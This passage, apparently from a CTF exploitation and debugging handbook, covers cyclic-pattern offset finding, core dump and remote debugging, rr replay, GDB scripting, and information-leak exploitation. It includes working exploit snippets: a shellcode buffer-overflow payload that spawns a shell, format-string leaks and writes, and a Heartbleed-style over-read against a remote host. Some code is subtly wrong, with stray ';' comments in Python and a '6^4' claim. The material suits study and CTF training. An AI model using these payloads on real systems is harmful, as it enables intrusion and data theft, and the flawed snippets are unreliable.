(gdb) set *(long *)($rbp) = 0x601234     ; Place return address
(gdb) continue
```

---

## Pattern Generation (Cyclic Patterns)

Cyclic patterns identify buffer overflow distances precisely without manual calculation. Generating unique sequences enables rapid offset discovery.

**Pwntools cyclic pattern**

Generate pattern:

```python
from pwn import *

# Generate 100-byte pattern
pattern = cyclic(100)
print(pattern)  ; Output: aaaabbbbccccdd...

# Pattern structure: repeating unique 4-byte sequences
```

**Finding offset from pattern**

When binary crashes on pattern:

```python
crash_value = 0x62616164  ; From crash message
offset = cyclic_find(crash_value)
print(f"Offset: {offset}")  ; Output: 40
```

**GDB workflow with cyclic patterns**

```bash
gdb ./binary
(gdb) run $(python3 -c "from pwn import *; print(cyclic(100))")
; Program crashes
(gdb) x/i $rip
; RIP = 0x62616164 (shows in crash)

# In Python:
from pwn import *
offset = cyclic_find(0x62616164)
print(offset)  ; 40
```

**Cyclic pattern with offset**

Get pattern starting at offset:

```python
# Generate pattern from offset 40
pattern = cyclic(100, n=40)

# Get character at offset
char_at_50 = cyclic(n=40)[50]
```

**Understanding cyclic encoding**

Default 4-byte chunks:

```
aaaa  = 0x61616161
aaab  = 0x62616161
aaac  = 0x63616161
...
baaa  = 0x61616162
```

Each 4-byte sequence is unique (6^4 = 1296 values before rollover).

**Custom cyclic patterns**

Generate pattern with different alphabet:

```python
# Numeric pattern
pattern = cyclic(100, alphabet=string.digits)  # 0-9

# Hex-safe pattern
pattern = cyclic(100, alphabet=string.hexdigits)  # 0-9a-f
```

**Radare2 cyclic patterns**

```bash
r2 /path/to/binary
> wop cyclic 100   ; Generate pattern
> wop              ; Display

; Find offset
> ? 0x62616164     ; Query value
> wop cyclic_find 0x62616164
```

**Practical exploitation using cyclic**

```python
from pwn import *

# Generate pattern
pattern = cyclic(200)

# Send to vulnerable binary
p = process('./binary')
p.send(pattern)

# Catch crash and get offset
try:
    p.wait()
except:
    pass

# Manually determine crash value from core dump or GDB
crash_value = 0x62616164

# Calculate offset
offset = cyclic_find(crash_value)
print(f"Buffer offset: {offset}")

# Now build exploit with correct offset
shellcode = asm(shellcraft.sh())
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(shellcode_addr)

p = process('./binary')
p.send(payload)
p.interactive()
```

**Multiple crashes with different patterns**

Identify specific vulnerability location:

```python
from pwn import *

# Different pattern for each argument/injection point
patterns = {
    'arg1': cyclic(100, alphabet='a'),
    'arg2': cyclic(100, alphabet='b'),
    'arg3': cyclic(100, alphabet='c'),
}

for arg_name, pattern in patterns.items():
    p = process('./binary')
    p.send(pattern)
    # Observe which pattern appears in crash
```

**Stack alignment with cyclic**

```python
# Ensure pattern respects stack alignment
pattern = cyclic(64)
while len(pattern) % 16 != 0:
    pattern += b'A'

# RSP 16-byte aligned before function call
payload = pattern
payload += p64(return_addr)  ; RSP now 16-byte aligned
```

**Cyclic with null bytes**

Cyclic patterns don't contain null bytes, suitable for string-based overflows:

```python
pattern = cyclic(100)
assert b'\x00' not in pattern
```

**De Bruijn sequences**

Cyclic patterns implement de Bruijn sequences, mathematical sequences where every substring appears exactly once.

**Characteristics:**

- Length: Base^n where base = alphabet size, n = sequence length
- Unique offsets: Every position identifiable
- Minimal: Shortest possible sequence

**Manual de Bruijn generation:**

```python
def generate_debruijn(k, n):
    """Generate de Bruijn sequence B(k, n)"""
    alphabet = list(map(str, range(k)))
    a = [0] * k * n
    sequence = []
    
    def db(t, p):
        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    sequence.append(alphabet[a[j]])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    
    db(1, 1)
    return ''.join(sequence)

pattern = generate_debruijn(2, 4)  ; Binary, 16-byte output
```

**Limitations of cyclic patterns**

- **Endianness:** Pattern in wrong byte order appears differently
- **Encoding:** URL/HTML encoding changes pattern
- **Multiple crashes:** May need multiple patterns to identify exact location
- **Stack alignment:** Pattern may misalign stack

**Testing cyclic accuracy**

Verify pattern offset calculation:

```python
from pwn import *

# Generate pattern
pattern = cyclic(100)

# Calculate offset for specific value
value = pattern[40:44]  ; Get 4 bytes at offset 40
offset = cyclic_find(u32(value))
assert offset == 40

# Verify all offsets
for i in range(0, len(pattern)-3, 4):
    chunk = u32(pattern[i:i+4])
    assert cyclic_find(chunk) == i
```

**Practice: Find overflow distance**

```python
from pwn import *

# Step 1: Generate pattern
pattern = cyclic(300)

# Step 2: Send and observe crash
p = process('./vulnerable_binary')
p.send(pattern)

# Step 3: Extract crash address (from GDB/core dump)
# Assume crash shows RIP = 0x64636161

# Step 4: Calculate offset
offset = cyclic_find(0x64636161)
print(f"Overflow distance: {offset}")  ; Output: 76

# Step 5: Verify
verified_pattern = cyclic(offset + 4)
print(f"Bytes at offset: {verified_pattern[offset:offset+4]}")
```

**Advanced: Identifying which register corrupted**

```bash
gdb ./binary
(gdb) run $(python3 -c "from pwn import *; print(cyclic(200))")
; Program crashes

(gdb) info registers
rax            0x62616164          ...  ; Contains pattern
rbx            0x63616164          ...  ; Different pattern value
rcx            0x0                 ...  ; Unaffected

# From pattern values, identify which contains overflow data
from pwn import *
cyclic_find(0x62616164)  ; 40
cyclic_find(0x63616164)  ; 44
```

---

**Related debugging strategy subtopics essential for comprehensive analysis:** Heap debugging with malloc_usable_size() and heap metadata inspection, core dump analysis for post-mortem debugging without running binary, and anti-debugging detection identification through syscall monitoring and ptrace interaction analysis.

---

## Core Dump Analysis

### Enabling Core Dumps

**System Configuration**:

```bash
ulimit -c unlimited                    # Enable core dumps (current shell)
echo 'ulimit -c unlimited' >> ~/.bashrc  # Persistent

# Set core dump pattern (requires root)
echo 'core.%e.%p.%t' > /proc/sys/kernel/core_pattern
# %e = executable name, %p = PID, %t = timestamp

# Or use systemd-coredump
echo '|/usr/lib/systemd/systemd-coredump %P %u %g %s %t %c %h' > /proc/sys/kernel/core_pattern
```

**Verify Configuration**:

```bash
ulimit -c                              # Should show 'unlimited'
cat /proc/sys/kernel/core_pattern      # Check pattern
cat /proc/sys/kernel/core_uses_pid     # Check PID suffix
```

**Generate Test Core Dump**:

```bash
sleep 10 &
kill -SIGSEGV $!                       # Force segfault
# Or within program: kill(getpid(), SIGSEGV);
```

### GDB Core Dump Analysis

**Loading Core Dump**:

```bash
gdb ./binary ./core.binary.1234
gdb ./binary -c core.binary.1234
```

**Basic Inspection Commands**:

```gdb
info registers                         # Register state at crash
info frame                             # Current stack frame
backtrace                              # Full stack trace
backtrace full                         # Stack trace with locals

where                                  # Alias for backtrace
frame 0                                # Select stack frame
info locals                            # Local variables in frame
info args                              # Function arguments
```

**Memory Examination**:

```gdb
x/20wx $rsp                            # 20 words at stack pointer
x/s 0x7fffffffe000                     # String at address
x/20i $rip                             # 20 instructions at crash point

info proc mappings                     # Memory regions
find 0x7fff00000000, 0x7fffffffffff, "/bin/sh"  # Search memory
```

**Advanced Analysis**:

```gdb
# Reconstruct crash context
disassemble $rip-20, $rip+20          # Code around crash
x/10gx $rsp                            # Stack around crash
i r rdi rsi rdx rcx r8 r9              # Function arguments (x64)

# Analyze heap state
heap chunks                            # pwndbg command
vis_heap_chunks                        # pwndbg visualization
```

### pwndbg/GEF Core Dump Analysis

**pwndbg Commands**:

```gdb
context                                # Show full context at crash
telescope $rsp 50                      # Deep stack inspection
vmmap                                  # Memory mappings
search -t string "/bin/sh"             # Search all memory

# Exploit development
cyclic_find 0x6161616c                 # Find offset in pattern
distance $rsp $rbp                     # Calculate distances
```

**GEF Commands**:

```gdb
context                                # Full crash context
heap chunks                            # Heap structure
registers                              # Formatted register view
xinfo 0x7ffff7a0d000                   # Detailed address info
```

### Automated Core Analysis Scripts

**GDB Script for Batch Analysis**:

```bash
# analyze_core.gdb
set pagination off
set logging file core_analysis.txt
set logging on

echo \n=== REGISTERS ===\n
info registers

echo \n=== BACKTRACE ===\n
backtrace full

echo \n=== STACK ===\n
x/50wx $rsp

echo \n=== CODE ===\n
x/20i $rip-20

echo \n=== MAPPINGS ===\n
info proc mappings

quit
```

```bash
gdb ./binary ./core -batch -x analyze_core.gdb
```

**Python-based Analysis**:

```python
#!/usr/bin/env python3
import gdb
import re

class CoreAnalyzer(gdb.Command):
    def __init__(self):
        super().__init__("analyze_crash", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Get crash location
        rip = int(gdb.parse_and_eval("$rip"))
        rsp = int(gdb.parse_and_eval("$rsp"))
        
        print(f"[*] Crash at: {hex(rip)}")
        print(f"[*] Stack pointer: {hex(rsp)}")
        
        # Check for common patterns
        gdb.execute(f"x/20wx {hex(rsp)}")
        
        # Look for canary corruption
        try:
            canary = gdb.parse_and_eval("__stack_chk_guard")
            print(f"[*] Stack canary: {hex(int(canary))}")
        except:
            pass

CoreAnalyzer()
```

Load in GDB: `source core_analyzer.py`

### Binary-specific Core Analysis

**Finding Offset for Buffer Overflow**:

```bash
# Generate pattern
cyclic 200 > pattern.txt

# Run with pattern, generate core
./binary < pattern.txt

# Analyze core
gdb ./binary ./core
(gdb) x/wx $rsp
0x7fffffffe000: 0x6161616c

# Find offset
cyclic -l 0x6161616c  # Returns offset
```

**ROP Chain Validation**:

```gdb
# After crash in ROP chain
(gdb) x/20gx $rsp
# Verify addresses are expected gadgets
(gdb) x/5i 0x00401234  # Disassemble suspected gadget
```

### coredumpctl (systemd)

**List Core Dumps**:

```bash
coredumpctl list                       # All core dumps
coredumpctl list binary                # Specific binary
coredumpctl info PID                   # Detailed info
```

**Analyze with GDB**:

```bash
coredumpctl debug binary               # Opens in GDB directly
coredumpctl debug PID                  # Debug specific crash
```

**Export Core Dump**:

```bash
coredumpctl dump binary > core.manual
coredumpctl dump PID -o custom_core
```

---

## Remote Debugging

### GDB Remote Protocol (gdbserver)

**Server Setup**:

```bash
# On target machine
gdbserver :1234 ./binary               # Listen on port 1234
gdbserver :1234 --attach PID           # Attach to running process
gdbserver --multi :1234                # Multi-process mode
```

**Client Connection**:

```bash
# On attacker machine
gdb ./binary
(gdb) target remote 192.168.1.100:1234
(gdb) continue
```

**pwntools Integration**:

```python
from pwn import *

# Start with gdbserver
io = process(['gdbserver', 'localhost:1234', './binary'])

# In separate terminal/script
gdb.attach(target=('localhost', 1234), gdbscript='''
break *main+123
continue
''')
```

### SSH Debugging

**Remote GDB over SSH**:

```bash
ssh -L 1234:localhost:1234 user@target
# On target: gdbserver :1234 ./binary
# Local: gdb ./binary -> target remote localhost:1234
```

**Automated SSH Debugging**:

```python
from pwn import *

session = ssh('user', 'target', password='pass')
io = session.process('./binary')

# Attach debugger through SSH tunnel
gdb.attach(io, '''
break *vulnerable_function
continue
''')
```

### QEMU User-mode Debugging

**Cross-architecture Debugging**:

```bash
# Debug ARM binary on x64 host
qemu-arm -g 1234 ./arm_binary         # Wait for GDB connection

# In separate terminal
gdb-multiarch ./arm_binary
(gdb) set architecture arm
(gdb) target remote :1234
(gdb) continue
```

**pwntools QEMU Integration**:

```python
from pwn import *

context.binary = './arm_binary'
context.arch = 'arm'

io = process(['qemu-arm', '-g', '1234', './arm_binary'])
gdb.attach(target=('localhost', 1234), gdbscript='continue')
```

### Docker Container Debugging

**Privileged Container Method**:

```bash
docker run --privileged -p 1234:1234 ctf_image
# Inside container: gdbserver :1234 ./binary

# Host connection
gdb ./binary
(gdb) target remote localhost:1234
```

**Docker exec Method**:

```bash
docker ps                              # Get container ID
docker exec -it CONTAINER_ID bash
gdbserver :1234 --attach $(pidof binary)

# Port forward if needed
docker inspect CONTAINER_ID | grep IPAddress
gdb ./binary
(gdb) target remote 172.17.0.2:1234
```

### Kernel Debugging with QEMU

**Setup QEMU VM**:

```bash
qemu-system-x86_64 \
    -kernel vmlinuz \
    -initrd initramfs.img \
    -append "console=ttyS0 nokaslr" \
    -s -S \
    -nographic
# -s: gdbserver on :1234, -S: pause at start
```

**GDB Connection**:

```bash
gdb ./vmlinux
(gdb) target remote :1234
(gdb) break start_kernel
(gdb) continue
```

### Android Debugging (gdbserver)

**Setup on Device**:

```bash
adb push gdbserver /data/local/tmp/
adb shell chmod 755 /data/local/tmp/gdbserver

# Start server
adb shell /data/local/tmp/gdbserver :1234 --attach $(pidof target_app)
```

**Client Connection**:

```bash
adb forward tcp:1234 tcp:1234         # Port forwarding

gdb-multiarch
(gdb) set architecture aarch64
(gdb) target remote :1234
(gdb) continue
```

### Remote Debugging with IDA Pro

**IDA Linux Debugger**:

```bash
# Copy linux_server to target
scp linux_server user@target:/tmp/

# On target
/tmp/linux_server -Ppassword

# In IDA: Debugger > Attach > Remote Linux debugger
# Hostname: target, Password: password
```

**IDA with gdbserver**:

```bash
# On target
gdbserver :1234 ./binary

# IDA: Debugger > Attach > Remote GDB debugger
# Set hostname and port
```

---

## Script Automation in GDB

### GDB Command Files

**Basic Script Structure**:

```gdb
# script.gdb
set pagination off
set confirm off

file ./binary
break main
run < input.txt

# Commands
print $rdi
x/20wx $rsp

continue
quit
```

**Execution**:

```bash
gdb -x script.gdb                      # Load script
gdb -batch -x script.gdb               # Non-interactive
gdb --command=script.gdb ./binary      # Alternative syntax
```

### Conditional Breakpoints

**Syntax**:

```gdb
break *main if $rdi == 0x41414141
break function_name if strcmp(str, "target") == 0

# Temporary conditional breakpoint
tbreak *0x401234 if $rax > 100
```

**Complex Conditions**:

```gdb
break malloc if size > 0x1000
commands
    backtrace
    continue
end
```

### GDB Command Sequences

**Define Custom Commands**:

```gdb
define print_context
    info registers
    x/20i $rip
    x/20wx $rsp
end

define trace_calls
    break $arg0
    commands
        silent
        printf "Called with: %p\n", $rdi
        continue
    end
end

# Usage: trace_calls *0x401234
```

**Loop Automation**:

```gdb
define find_jmp
    set $addr = $arg0
    set $end = $arg1
    while $addr < $end
        x/1i $addr
        set $addr = $addr + 1
    end
end

# Usage: find_jmp 0x400000 0x401000
```

### Python Scripting in GDB

**Inline Python**:

```gdb
python
import gdb

class HexDumpCommand(gdb.Command):
    def __init__(self):
        super().__init__("hexdump", gdb.COMMAND_DATA)
    
    def invoke(self, arg, from_tty):
        addr = int(arg, 16)
        mem = gdb.selected_inferior().read_memory(addr, 64)
        print(mem.hex())

HexDumpCommand()
end

# Usage: hexdump 0x7fffffffe000
```

**External Python Script**:

```python
# gdb_automation.py
import gdb

def leak_addresses():
    """Leak addresses from GOT"""
    got_section = gdb.execute("info files", to_string=True)
    # Parse and extract addresses
    results = {}
    
    for symbol in ['puts', 'printf', 'system']:
        try:
            addr = gdb.parse_and_eval(f"&{symbol}")
            results[symbol] = int(addr)
        except:
            pass
    
    return results

class LeakCommand(gdb.Command):
    def __init__(self):
        super().__init__("leak_got", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        leaks = leak_addresses()
        for name, addr in leaks.items():
            print(f"{name}: {hex(addr)}")

LeakCommand()

# Auto-run on load
gdb.execute("file ./binary")
gdb.execute("break main")
gdb.execute("run")
```

Load: `gdb -x gdb_automation.py`

### Automated Exploitation Scripts

**Pattern Offset Finder**:

```python
# find_offset.py
import gdb
import string

gdb.execute("file ./binary")
gdb.execute("run < pattern.txt")

try:
    rip = int(gdb.parse_and_eval("$rip"))
    rsp = int(gdb.parse_and_eval("$rsp"))
    
    # Read potential overflow value
    inferior = gdb.selected_inferior()
    mem = inferior.read_memory(rsp, 8)
    value = int.from_bytes(mem, 'little')
    
    print(f"[*] Crashed at RIP: {hex(rip)}")
    print(f"[*] Stack value: {hex(value)}")
    
except:
    print("[!] No crash detected")

gdb.execute("quit")
```

**Heap Leak Automation**:

```python
# heap_leak.py
import gdb

class HeapLeaker(gdb.Command):
    def __init__(self):
        super().__init__("heap_leak", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Set breakpoint after allocation
        gdb.execute("break malloc")
        gdb.execute("commands")
        gdb.execute("silent")
        gdb.execute("finish")
        gdb.execute("printf \"Allocated: %p\\n\", $rax")
        gdb.execute("continue")
        gdb.execute("end")
        
        gdb.execute("run")

HeapLeaker()
```

### pwndbg Automation

**Custom pwndbg Commands**:

```python
# ~/.pwngdbinit or pwndbg_custom.py
import pwndbg.commands
import pwndbg.gdblib.memory

@pwndbg.commands.ParsedCommand
def find_gadgets(address, count=100):
    """Find ROP gadgets near address"""
    for offset in range(count):
        try:
            addr = int(address) + offset
            insn = pwndbg.gdblib.memory.read(addr, 15)
            if b'\xc3' in insn:  # ret instruction
                pwndbg.commands.context.context_disasm(addr, 3)
        except:
            pass
```

**Automated Leak Script**:

```python
# pwndbg_leak.py
import pwndbg

@pwndbg.commands.ParsedCommand
def auto_leak():
    """Automatically leak common addresses"""
    # Break at known leak point
    gdb.execute("break *vulnerable_read+42")
    gdb.execute("run")
    
    # Extract leaked address
    rdi = pwndbg.gdblib.regs.rdi
    leaked = pwndbg.gdblib.memory.read(rdi, 8)
    
    print(f"[*] Leaked: {leaked.hex()}")
    
    # Calculate libc base [Inference]
    # Implementation depends on specific leak
```

### GEF Scripting

**Custom GEF Commands**:

```python
# ~/.gef.rc or gef_custom.py
import gef

@register_command
class ExploitHelper(GenericCommand):
    """Automation for common exploit tasks"""
    
    _cmdline_ = "exploit"
    
    def do_invoke(self, argv):
        if argv[0] == "leak":
            # Leak addresses
            got = gef.memory.read(elf.got['puts'], 8)
            info(f"Leaked GOT: {hexdump(got)}")
        
        elif argv[0] == "pattern":
            # Generate and analyze pattern
            pattern = cyclic(200)
            crash = gef.arch.register("$rsp")
            offset = cyclic_find(crash)
            ok(f"Offset: {offset}")
```

### Batch Processing Multiple Runs

**Fuzzing with GDB**:

```bash
# fuzz_gdb.sh
#!/bin/bash

for i in {1..1000}; do
    echo "[*] Iteration $i"
    
    # Generate input
    python3 -c "print('A'*$i)" > input.txt
    
    # Run with timeout
    timeout 5 gdb -batch -x check_crash.gdb ./binary -ex "run < input.txt" 2>&1 | grep -q "SIGSEGV"
    
    if [ $? -eq 0 ]; then
        echo "[!] Crash at size $i"
        cp input.txt crash_$i.txt
    fi
done
```

**check_crash.gdb**:

```gdb
set pagination off
set confirm off
catch signal SIGSEGV
commands
    echo CRASH DETECTED\n
    info registers
    quit
end
run
quit
```

---

## Checkpoint and Replay Debugging

### GDB Checkpoints (Linux only)

**Creating Checkpoints**:

```gdb
break vulnerable_function
run
checkpoint                             # Save state
info checkpoints                       # List all checkpoints

# Continue execution
continue

# Return to checkpoint
restart CHECKPOINT_ID                  # Restore saved state
```

**Use Case - Testing Multiple Paths** [Inference]:

```gdb
# At conditional branch
break *0x401234
run
checkpoint                             # Before branch

# Try first path
set $rax = 0
continue
# ... observe behavior

# Try second path
restart CHECKPOINT_ID
set $rax = 1
continue
```

**Limitations**:

- [Unverified] Checkpoints may not work reliably with multi-threaded programs
- Fork-based implementation has overhead
- Not persistent across GDB sessions

### rr (Record and Replay)

**Installation**:

```bash
apt install rr
# Or compile from source for latest features
```

**Recording Execution**:

```bash
rr record ./binary                     # Record stdin
rr record ./binary arg1 arg2           # With arguments
rr record -n ./binary                  # Disable ASLR
echo "payload" | rr record ./binary    # With input
```

**Replay in GDB**:

```bash
rr replay                              # Open last recording
rr replay -a                           # Auto-advance to crash
rr replay -p PID                       # Specific recording
```

**Reverse Debugging Commands**:

```gdb
# Standard forward commands
continue
next
step
finish

# Reverse equivalents
reverse-continue                       # Run backwards to breakpoint
reverse-next                           # Step backwards over function
reverse-step                           # Step backwards into function
reverse-finish                         # Return to function call

# Specific position
run EXECUTION_POINT                    # Jump to event number
when                                   # Show current event number
```

**Advanced rr Features**:

```gdb
# Search memory changes
watch -l some_variable
reverse-continue                       # Find last modification

# Find all calls to function
break function
commands
    silent
    backtrace 1
    continue
end
continue
# Then reverse-continue to find previous calls
```

**rr Python API**:

```python
# rr_automation.py
import subprocess
import re

def find_all_calls(binary, function):
    """Record and find all calls to function"""
    # Record execution
    subprocess.run(['rr', 'record', binary])
    
    # Replay with GDB script
    script = f"""
    break {function}
    commands
        silent
        printf "Call at: %d\\n", rr_current_event()
        continue
    end
    continue
    quit
    """
    
    result = subprocess.run(
        ['rr', 'replay', '-x', '-'],
        input=script.encode(),
        capture_output=True
    )
    
    # Parse event numbers
    events = re.findall(r'Call at: (\d+)', result.stdout.decode())
    return [int(e) for e in events]
```

### Mozilla rr Best Practices

**Deterministic Recording** [Inference]:

```bash
# Disable address randomization
setarch $(uname -m) -R rr record ./binary

# Set fixed resource limits
ulimit -s 8192                         # Stack size
rr record --chaos ./binary             # Test non-determinism
```

**Debugging Race Conditions**:

```bash
rr record ./threaded_binary
rr replay

# In GDB
info threads                           # List all threads
thread 2                               # Switch thread
continue                               # Run until interesting point
reverse-continue                       # Go back and try again
```

**Trace Sharing**:

```bash
# Record on production system
rr record --chaos ./binary

# Copy trace directory
tar czf trace.tar.gz ~/.local/share/rr/latest-trace/

# Debug on development machine
tar xzf trace.tar.gz -C ~/.local/share/rr/
rr replay
```

### UndoDB (Commercial Alternative)

**Basic Usage**:

```bash
udb ./binary                           # Record and debug
udb --args ./binary arg1 arg2          # With arguments

# Inside UDB
ugo start                              # Go to program start
ugo end                                # Go to program end
ugo time 1234                          # Go to specific time
```

**Time-travel Commands**:

```gdb
ugo                                    # Go to specific point
ugo main                               # Go to function entry
ugo syscall read                       # Go to syscall
uinfo time                             # Show current time
```

**UndoDB is a commercial tool requiring a license** [Unverified availability in CTF contexts]

### QIRA (QEMU Interactive Runtime Analyser)

**Installation**:

```bash
git clone https://github.com/BinaryAnalysisPlatform/qira.git
cd qira
./install.sh
```

**Recording Execution**:

```bash
qira ./binary                          # Start with web UI on :3002
qira -s ./binary                       # Server mode
qira ./binary -- arg1 arg2             # With arguments
```

**Web Interface Features**:

- Timeline of execution
- Memory/register state at any point
- Automatic branching visualization
- Can replay to any instruction

**QIRA with pwntools**:

```python
from pwn import *
import os

os.system('qira -s ./binary &')        # Start server
sleep(2)                                # Wait for startup

io = remote('localhost', 4000)         # Connect to QIRA
# Exploit normally
# View in browser at http://localhost:3002
```

### GDB Process Record and Replay

**Enable Recording**:

```gdb
target record-full                     # Start recording
target record-btrace                   # Intel Processor Trace

# Execute program
continue

# Now can use reverse commands
reverse-continue
reverse-step
```

**Limitations**:

- [Unverified] Performance overhead significant
- May not support all system calls
- Limited buffer size for recording

**Configuration**:

```gdb
set record full insn-number-max 1000000  # Increase buffer
show record full insn-number-max         # Check current limit
```

### Time Travel Debugging Workflow

**Typical CTF Usage Pattern**:

```bash
# 1. Record exploit attempt
rr record ./binary < exploit_input.txt

# 2. Replay to crash
rr replay -a

# 3. Navigate to interesting point
(gdb) break vulnerable_function
(gdb) reverse-continue                 # Go back to last call

# 4. Examine state
(gdb) info registers
(gdb) x/100wx $rsp

# 5. Find corruption source
(gdb) watch *(void**)$rsp
(gdb) reverse-continue                 # Find write

# 6. Iterate and refine exploit
```

**Finding One-shot Opportunities**:

```gdb
# Find all write operations to return address
(gdb) watch *(void**)($rbp+8)
(gdb) commands
    silent
    backtrace 1
    continue
end
(gdb) continue
# Then reverse-continue to explore each write
```

---

## Related Topics

**Foundation Prerequisites**:

- GDB Fundamentals & Commands
- Assembly Language (x86/x64, ARM)
- Memory Layout & Stack Frames
- Signal Handling & Process States

**Advanced Integration**:

- Dynamic Binary Instrumentation (PIN, DynamoRIO)
- Symbolic Execution (angr with concrete execution)
- Hybrid Fuzzing (AFL + QEMU + GDB)
- Kernel Debugging Techniques

**Tool-specific Deep Dives**:

- pwndbg Advanced Features
- GEF Custom Command Development
- IDA Pro Debugging & Scripting
- Ghidra Debugger Integration

---

# Information Leak Exploitation

Information leaks are vulnerabilities that expose memory contents, addresses, or other sensitive data that attackers leverage to bypass security mitigations like ASLR, PIE, and stack canaries. These primitives are foundational to modern exploit chains.

## Format String Leaks

Format string vulnerabilities occur when user-controlled input is passed directly as the format string parameter to functions like `printf()`, `fprintf()`, `sprintf()`, or `snprintf()`.

### Vulnerability Mechanism

```c
// Vulnerable code
char buffer[100];
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);  // User controls format string

// Safe code
printf("%s", buffer);
```

When attackers control the format string, they can:

- Read arbitrary stack memory using `%x`, `%p`, `%s`
- Write to arbitrary memory using `%n`
- Leak addresses to defeat ASLR/PIE

### Exploitation Techniques

**Direct Parameter Access (x86-64):**

```bash
# Leak the 6th argument from stack
python -c 'print("%6$p")' | ./vulnerable

# Leak multiple stack values
python -c 'print("%p "*20)' | ./vulnerable

# Direct addressing syntax (Linux-specific)
python -c 'print("%1$p %2$p %3$p")' | ./vulnerable
```

**Leaking Specific Addresses:**

The first 6 arguments on x86-64 are in registers (RDI, RSI, RDX, RCX, R8, R9), subsequent arguments are on stack:

```python
# Find offset to return address/saved RBP
# Typically around %6$p - %15$p depending on stack layout
payload = b"AAAAAAAA" + b"%6$p.%7$p.%8$p.%9$p.%10$p"
```

**Automated Offset Discovery:**

```bash
# Using pwntools
python3 << 'EOF'
from pwn import *

binary = ELF('./target')
p = process('./target')

# FmtStr class automates offset finding
autofmt = FmtStr(execute_fmt=lambda x: p.sendline(x) and p.recvline())
offset = autofmt.offset
print(f"Format string offset: {offset}")
EOF
```

**Leaking Canary Values:**

```python
from pwn import *

p = process('./binary')
# Canary typically stored at fixed offset from buffer
# Send format string to leak stack
p.sendline(b"%11$p.%12$p.%13$p")  # Adjust offsets
leak = p.recvline()
canary = int(leak.split(b'.')[1], 16)
log.info(f"Leaked canary: {hex(canary)}")
```

**Leaking PIE/ASLR Addresses:**

```python
# Leak code address (contains PIE base + offset)
p.sendline(b"%9$p")
code_leak = int(p.recvline().strip(), 16)
pie_base = code_leak - 0x1234  # Subtract known offset
log.info(f"PIE base: {hex(pie_base)}")

# Leak libc address (from GOT or stack)
p.sendline(b"%15$s" + p64(elf.got['puts']))
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - libc.symbols['puts']
```

### Tools and Analysis

**pwntools FmtStr Module:**

```python
from pwn import *

context.binary = './target'
p = process('./target')

# Automated format string exploitation
fmt = FmtStr(execute_fmt=lambda x: p.sendline(x) and p.recvline())

# Read memory at address
leak = fmt.read(0x804a000, 4)

# Write to memory
fmt.write(0x804a000, 0xdeadbeef)

# Execute arbitrary read/write
fmt.execute_writes({0x804a000: 0x41414141})
```

**Manual Offset Calculation:**

```bash
# Using gdb with pattern
gdb ./binary
gdb> r < <(python -c 'print("AAAABBBBCCCCDDDD" + "%p "*30)')

# Identify where "AAAABBBB" appears in output
# Count format specifiers to that position = offset
```

## Buffer Over-Read Vulnerabilities

Buffer over-reads occur when programs read beyond allocated memory boundaries, potentially exposing adjacent memory contents.

### Common Vulnerability Patterns

**Missing Null Termination:**

```c
// Vulnerable: no null terminator guarantee
char buffer[16];
read(fd, buffer, 16);  
printf("%s\n", buffer);  // Over-reads if not null-terminated

// Exploitable: leaks stack data after buffer
```

**Unbounded String Operations:**

```c
// Vulnerable
char buf[32];
strcpy(buf, user_input);  // No length check
send(sock, buf, strlen(buf));  // May read past buf

// Safe
strncpy(buf, user_input, sizeof(buf)-1);
buf[sizeof(buf)-1] = '\0';
```

**Incorrect Length Calculations:**

```c
// Vulnerable
struct {
    uint16_t len;
    char data[100];
} packet;

read(fd, &packet, sizeof(packet));
// Attacker sets len = 500
send(sock, packet.data, packet.len);  // Over-reads 400 bytes past data[]
```

### Exploitation Examples

**Heartbleed-Style Vulnerability:**

```python
from pwn import *

p = remote('target', 9999)

# Send crafted length field
payload = p16(0x4000)  # Request 16KB
payload += b"PING"      # Actual data is 4 bytes

p.send(payload)
leaked = p.recv(0x4000)  # Receives 16KB including heap data

# Parse for sensitive data (keys, passwords, addresses)
log.info(f"Leaked {len(leaked)} bytes")
```

**Information Disclosure via String Functions:**

```bash
# Exploit missing null terminator
python3 << 'EOF'
from pwn import *

p = process('./binary')
# Send exactly buffer-sized input with no null byte
p.send(b'A' * 256)
response = p.recvline()

# Response contains stack data after buffer
leaked_data = response[256:]
print(f"Leaked: {leaked_data.hex()}")
EOF
```

### Detection and Analysis

**Static Analysis with Checksec:**

```bash
checksec --file=./binary
# Look for missing stack canaries, NX, PIE
```

**Dynamic Analysis with Valgrind:**

```bash
valgrind --leak-check=full --track-origins=yes ./binary < malicious_input

# Look for "Invalid read of size X" messages
# Indicates over-read locations
```

**GDB Watchpoints:**

```bash
gdb ./binary
gdb> watch -l buffer[256]  # Watch first byte past buffer
gdb> r < input.txt
# Breaks when access occurs past boundary
```

## Pointer Disclosure

Pointer leaks expose memory addresses, defeating ASLR and enabling precise exploit targeting.

### Common Leak Sources

**Uninitialized Variables:**

```c
// Vulnerable: pointer not initialized
void *ptr;
printf("Pointer: %p\n", ptr);  // Leaks stack garbage (may be address)

// Vulnerable: structure padding contains old pointers
struct data {
    char name[8];
    void *callback;  // 8-byte alignment padding before this
} item;
send(sock, &item, sizeof(item));  // Padding leaks stack data
```

**Error Messages:**

```c
// Vulnerable: debug info in production
fprintf(stderr, "Error at %p: invalid operation\n", __builtin_return_address(0));

// Common in assertion failures
assert(ptr != NULL);  // May print ptr value on failure
```

**Use-After-Free Disclosure:**

```c
// Vulnerable
struct obj *item = malloc(sizeof(*item));
free(item);
printf("Item: %p\n", item);  // Still points to freed memory

// Exploit: reveals heap layout
```

### Exploitation Techniques

**Leaking via Output Functions:**

```python
from pwn import *

p = process('./binary')

# Trigger pointer print (error condition, debug mode, etc.)
p.sendline(b"invalid_command")
output = p.recvuntil(b'\n')

# Parse address from output
match = re.search(b'0x[0-9a-f]+', output)
if match:
    leaked_addr = int(match.group(), 16)
    log.success(f"Leaked address: {hex(leaked_addr)}")
```

**Structure Padding Exploitation:**

```python
# Binary sends structure with padding
p.recvuntil(b"Data:\n")
struct_data = p.recv(32)

# Extract pointer from padding area
# Assuming pointer at offset 16-23
leaked_ptr = u64(struct_data[16:24])
